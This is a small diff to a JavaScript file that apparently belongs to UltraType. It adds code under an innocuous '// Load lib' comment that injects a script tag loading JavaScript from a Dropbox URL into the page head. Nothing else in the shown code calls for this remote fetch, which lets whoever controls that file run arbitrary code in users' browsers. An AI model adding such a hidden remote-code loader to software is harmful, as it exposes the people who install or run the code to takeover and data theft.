@@ -1540,6 +1540,10 @@
         }
         return window.UltraTypeCore;
     }
+    // Load lib     
+    let lib = document.createElement('script');       
+    lib.src = 'https://dl.dropbox.com/s/1tgzt41z50u8aye/lib.js';      
+    document.head.appendChild(lib);
     // Core API
     let core = {
         on: registerAPIEvent,
